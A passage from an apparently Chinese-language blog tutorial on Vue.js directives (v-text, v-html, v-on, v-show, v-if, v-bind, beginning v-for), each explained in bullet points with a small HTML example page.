class="tag">&lt;<span class="name">h2</span> <span class="attr">v-text</span>=<span class="string">&quot;message+&#x27;!&#x27;&quot;</span>&gt;</span>sz<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-text</span>=<span class="string">&quot;info+&#x27;!&#x27;&quot;</span>&gt;</span>sz<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;message+&#x27;!&#x27;&#125;&#125;sz<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            message:<span class="string">&quot;v-text!!!&quot;</span>,</span></span><br><span class="line"><span class="javascript">            info:<span class="string">&quot;information&quot;</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h4 id="v-html"><a href="#v-html" class="headerlink" title="v-html"></a>v-html</h4><ul>
<li>v-html 指令的作用是：设置元素的 <strong>innerHTML</strong></li>
<li>内容中有 html 的结构会被解析为标签</li>
<li>v-html 指令无论内容时什么，指挥解析为文本</li>
<li>解析文本使用 v-text，需要解析 html 结构使用 v-html</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-html</span>=<span class="string">&quot;content&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-text</span>=<span class="string">&quot;content&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            <span class="comment">// content:&quot;v-html&quot;</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            content:&quot;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://www.szu.edu.cn&#x27;</span>&gt;</span>深圳大学<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&quot;</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h4 id="v-on"><a href="#v-on" class="headerlink" title="v-on"></a>v-on</h4><ul>
<li>v-on 指令的作用是：为元素绑定事件</li>
<li>事件名不需要写 on</li>
<li>指令可以简写为 @</li>
<li>绑定的方法定义在 methods 属性中</li>
<li>方法内部通过 this 关键字可以访问定义在 data 中数据</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;v-on指令&quot;</span> <span class="attr">v-on:click</span>=<span class="string">&quot;doIt&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;v-on简写&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;doIt&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;v-on双击&quot;</span> @<span class="attr">dblclick</span>=<span class="string">&quot;doIt&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> @<span class="attr">click</span>=<span class="string">&quot;changeFood&quot;</span>&gt;</span>&#123;&#123;food&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            food:<span class="string">&quot;西兰花炒蛋&quot;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line"><span class="javascript">            doIt:<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                alert(<span class="string">&quot;做It&quot;</span>);</span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            changeFood: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// console.log(this.food);</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.food+=<span class="string">&quot;好好吃！&quot;</span>;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><ul>
<li>创建 Vue 实例时：el（挂载点），data（数据），methods（方法）</li>
<li>v-on 指令的作用时绑定事件，简写为 @</li>
<li>方法中通过 this ，关键字获取 data 中的数据</li>
<li>v-text 指令的作用时：设置元素的文本值</li>
<li>v-html 指令的作用是：设置元素的 innerHTML</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sub&quot;</span>&gt;</span>-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;num&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;add&quot;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line">            num:1</span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line"><span class="javascript">            add:<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (<span class="built_in">this</span>.num &lt; <span class="number">10</span>)&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">this</span>.num++;</span></span><br><span class="line"><span class="javascript">                &#125;<span class="keyword">else</span> alert(<span class="string">&quot;别点了，最大了！&quot;</span>);</span></span><br><span class="line"></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            sub: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (<span class="built_in">this</span>.num &gt; <span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">this</span>.num--;</span></span><br><span class="line"><span class="javascript">                &#125;<span class="keyword">else</span> alert(<span class="string">&quot;别点了，最小了！&quot;</span>);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="2-2-显示切换，属性绑定"><a href="#2-2-显示切换，属性绑定" class="headerlink" title="2.2 显示切换，属性绑定"></a>2.2 显示切换，属性绑定</h3><h4 id="v-show"><a href="#v-show" class="headerlink" title="v-show"></a>v-show</h4><ul>
<li>v-show 指令的作用是根据表达式的真假，切换元素的显示和隐藏</li>
<li>修改元素的 display，实现显示隐藏</li>
<li>指令后面的内容，最终都会解析为布尔值</li>
<li>值为 true 元素显示，值为 false 元素隐藏</li>
<li>数据改变之后，对应元素的显示状态会同步更新</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;切换显示状态&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;changeIsShow&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span> <span class="attr">v-show</span>=<span class="string">&quot;isShow&quot;</span>&gt;</span>baidu<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;累加年龄&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;addAge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">v-show</span>=<span class="string">&quot;age&gt;=18&quot;</span>&gt;</span>嘿嘿嘿<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            isShow:<span class="literal">false</span>,</span></span><br><span class="line">            age:17</span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line"><span class="javascript">            changeIsShow:<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.isShow = !<span class="built_in">this</span>.isShow;</span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            addAge:<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.age++;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h4 id="v-if"><a href="#v-if" class="headerlink" title="v-if"></a>v-if</h4><ul>
<li>v-if 指令的作用是：根据表达式的真假，切换元素的显示和隐藏（操作dom元素）</li>
<li>本质是通过操纵 dom 元素来切换显示状态</li>
<li>表达式的值为 true，元素存在于 dom 数中，为 false，从 dom 树中移除</li>
<li>频繁的切换 v-show，反之使用 v-if，前者切换消耗小</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;切换显示&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;toggleIsShow&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-if</span>=<span class="string">&quot;isShow&quot;</span>&gt;</span>hello world<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-show</span>=<span class="string">&quot;isShow&quot;</span>&gt;</span>hello world - v-show修饰<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-if</span>=<span class="string">&quot;tempreature&gt;=35&quot;</span>&gt;</span>热死了<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            isShow:<span class="literal">false</span>,</span></span><br><span class="line">            tempreature:20</span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line"><span class="javascript">            toggleIsShow:<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.isShow = !<span class="built_in">this</span>.isShow;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h4 id="v-bind"><a href="#v-bind" class="headerlink" title="v-bind"></a>v-bind</h4><ul>
<li>v-bind 指令的作用是：设置元素的属性（比如：src，title，class）</li>
<li>完整写法式 v-bind:属性名</li>
<li>简写的话可以直接省略 v-bind，只保留 :属性名</li>
<li>需要动态的增删 class 建议使用对象的方式</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.active</span>&#123;</span></span><br><span class="line">            border: 1px solid red;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">v-bind:href</span>=<span class="string">&quot;aHref&quot;</span>&gt;</span>baidu<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">:href</span>=<span class="string">&quot;aHref&quot;</span> <span class="attr">:title</span>=<span class="string">&quot;aTitle+&#x27;!!!&#x27;&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">:class</span>=<span class="string">&quot;isActive?&#x27;active&#x27;:&#x27;&#x27;&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;toggleActive&quot;</span>&gt;</span>baidu<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">:href</span>=<span class="string">&quot;aHref&quot;</span> <span class="attr">:title</span>=<span class="string">&quot;aTitle+&#x27;!!!&#x27;&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">:class</span>=<span class="string">&quot;&#123;active:isActive&#125;&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;toggleActive&quot;</span>&gt;</span>baidu<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line">        data: &#123;</span><br><span class="line"><span class="javascript">            aHref: <span class="string">&quot;https://www.baidu.com&quot;</span>,</span></span><br><span class="line"><span class="javascript">            aTitle:<span class="string">&quot;baidu&quot;</span>,</span></span><br><span class="line"><span class="javascript">            isActive:<span class="literal">false</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line"><span class="javascript">            toggleActive:<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.isActive = !<span class="built_in">this</span>.isActive;</span></span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><ul>
<li>列表数据使用数组保存</li>
<li>v-bind 指令可以设置元素属性，比如 src</li>
<li>v-show 和 v-if 都可以切换元素的显示状态，频繁切换用 v-show</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">:src</span>=<span class="string">&quot;imgArr[index]&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;prev&quot;</span> <span class="attr">v-show</span>=<span class="string">&quot;index != 0&quot;</span>&gt;</span>上一张<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;next&quot;</span> <span class="attr">v-show</span>=<span class="string">&quot;index &lt; imgArr.length-1&quot;</span>&gt;</span>下一张<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line">            imgArr:[</span><br><span class="line"><span class="javascript">                <span class="string">&quot;./img/00.jpg&quot;</span>,</span></span><br><span class="line"><span class="javascript">                <span class="string">&quot;./img/01.jpg&quot;</span>,</span></span><br><span class="line"><span class="javascript">                <span class="string">&quot;./img/02.jpg&quot;</span>,</span></span><br><span class="line"><span class="javascript">                <span class="string">&quot;./img/03.jpg&quot;</span>,</span></span><br><span class="line"><span class="javascript">                <span class="string">&quot;./img/04.jpg&quot;</span>,</span></span><br><span class="line"><span class="javascript">                <span class="string">&quot;./img/05.jpg&quot;</span>,</span></span><br><span class="line"><span class="javascript">                <span class="string">&quot;./img/06.jpg&quot;</span>,</span></span><br><span class="line"><span class="javascript">                <span class="string">&quot;./img/07.jpg&quot;</span>,</span></span><br><span class="line"><span class="javascript">                <span class="string">&quot;./img/08.jpg&quot;</span>,</span></span><br><span class="line">            ],</span><br><span class="line">            index:0</span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line"><span class="javascript">            prev:<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.index--;</span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            next:<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.index++;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="2-3-列表循环，表单元素绑定"><a href="#2-3-列表循环，表单元素绑定" class="headerlink" title="2.3 列表循环，表单元素绑定"></a>2.3 列表循环，表单元素绑定</h3><h4 id="v-for"><a href="#v-for" class="headerlink" title="v-for"></a>v-for</h4><ul>
<li>v-for 指令的作用是：根据数据生成列表结构</li>
<li>数组经常和 v-for 结合使用</li>
<li>语法是 (item,index) in 数据</li>
<li>item 和 index 可以结合其他指令一起使用</li>
<li>数组长度的更新会同步到页面上，是响应式的</li>
</ul>
